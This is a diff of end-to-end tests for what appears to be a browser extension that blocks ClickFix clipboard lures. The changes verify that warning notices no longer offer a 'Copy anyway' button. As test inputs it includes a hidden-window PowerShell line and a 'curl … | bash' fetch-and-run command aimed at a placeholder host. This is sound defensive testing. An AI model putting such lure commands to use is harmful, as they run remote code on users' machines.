@@ -30,11 +30,11 @@ const UBO_HIGH = x('power', 'shell -w hid', 'den -c "Write-Output test"');
 /** Matches uBO's ClickFix filter (curl -s … | bash); Bastion rates it 'medium'. */
 const UBO_MEDIUM = x('curl -s https://example.invalid/install.sh | ', 'bash');
 
-const COPY_ANYWAY = /^(Copy anyway|Trotzdem kopieren|Copier quand même|Copia comunque)$/;
+/** The removed override button, in any UI language: it must never appear (it would become part of the lure). */
+const COPY_BUTTON = /^(Copy anyway|Trotzdem kopieren|Copier quand même|Copia comunque)$/i;
 const CLOSE = /^(Close|Schliessen|Fermer|Chiudi)$/;
 const CLIP_TITLE = /ClickFix/;
-const HIGH_NOTE = /(Clear attack pattern|Eindeutiges Angriffsmuster|Schéma d’attaque évident|Schema di attacco evidente)/;
-const COPIED = /^(Copied\.|Kopiert\.|Copié\.|Copiato\.)/;
+const MANUAL_NOTE = /(select and copy it yourself|markieren und kopieren Sie ihn selbst|copiez-la vous-même|copiatelo voi stessi)/;
 const SOURCE_UBO = /uBlock/;
 const SOURCE_BASTION = /(Bastion ClickFix|ClickFix de Bastion|ClickFix di Bastion)/;
 const PHISHING = /(possible phishing|möglicherweise Phishing|phishing possible|possibile phishing)/;
@@ -94,7 +94,7 @@ test.describe('blocker notices (nerd mode off)', () => {
     await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: false } } }, 6000);
   });
 
-  test("uBO's ClickFix filter shows the Bastion notice; copy anyway for medium only", async ({ page, server, ext }) => {
+  test("uBO's ClickFix filter shows the Bastion notice, never a copy button", async ({ page, server, ext }) => {
     const url = server.setPage(HOSTS.A, '/e2e/notice-ubo.html', UBO_PAGE);
     await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
     await page.goto(url);
@@ -113,25 +113,20 @@ test.describe('blocker notices (nerd mode off)', () => {
     await expect.poll(() => notices(page)).toHaveLength(1);
     let ax = await axTree(page);
     expect((await notices(page))[0]).toMatch(CLIP_TITLE);
-    expect(hasText(ax, HIGH_NOTE), 'high: the explanation instead of a copy button').toBe(true);
-    expect(hasButton(ax, COPY_ANYWAY), 'high: no copy anyway').toBe(false);
+    expect(hasText(ax, MANUAL_NOTE), 'the copy-it-yourself note').toBe(true);
+    expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);
     expect(hasText(ax, SOURCE_UBO), 'source line').toBe(true);
     expect(await noUboBar(page), "uBO's beige bar never appears").toBe(true);
 
     expect(await write(UBO_MEDIUM), 'uBO prevents the write').toBe('reset');
     await expect.poll(() => notices(page)).toHaveLength(2);
     ax = await axTree(page);
-    expect(ax.filter((n) => n.role === 'button' && COPY_ANYWAY.test(n.name)), 'medium: copy anyway').toHaveLength(1);
+    expect(hasButton(ax, COPY_BUTTON), 'medium: no copy button either').toBe(false);
 
     // The same text again within 2 s: still two notices.
     await write(UBO_MEDIUM);
     await page.waitForTimeout(150);
     expect(await notices(page)).toHaveLength(2);
-
-    await clickAx(page, 'button', COPY_ANYWAY);
-    await expect.poll(() => page.evaluate(() => navigator.clipboard.readText()), { message: 'copied from the isolated world' }).toBe(UBO_MEDIUM);
-    await expect.poll(async () => hasText(await axTree(page), COPIED)).toBe(true);
-    expect(hasButton(await axTree(page), COPY_ANYWAY)).toBe(false);
 
     // The × button closes a notice; Esc closes the focused one (keyboard only).
     await clickAx(page, 'button', CLOSE);
@@ -230,14 +225,13 @@ test.describe('nerd mode guards', () => {
     expect(viaWrite, 'clipboard.write with text/plain').toBe(CLIP_REPLACEMENT);
 
     // The guard's blocks show the Bastion notice (identical text within 2 s
-    // once, at most three cards): the high command without, the invisible
-    // install line with «Copy anyway».
+    // once, at most three cards), none with a copy button.
     await expect.poll(async () => (await notices(page)).length).toBeGreaterThanOrEqual(2);
     const ax = await axTree(page);
     expect((await notices(page)).length).toBeLessThanOrEqual(3);
     expect(hasText(ax, SOURCE_BASTION), 'source line: Bastion ClickFix protection').toBe(true);
-    expect(hasText(ax, HIGH_NOTE), 'high: no copy offered').toBe(true);
-    expect(hasButton(ax, COPY_ANYWAY), 'medium: copy anyway').toBe(true);
+    expect(hasText(ax, MANUAL_NOTE), 'copy-it-yourself note').toBe(true);
+    expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);
 
     // A real click (uBO's scriptlet may answer first): the payload never lands.
     await write('reset');
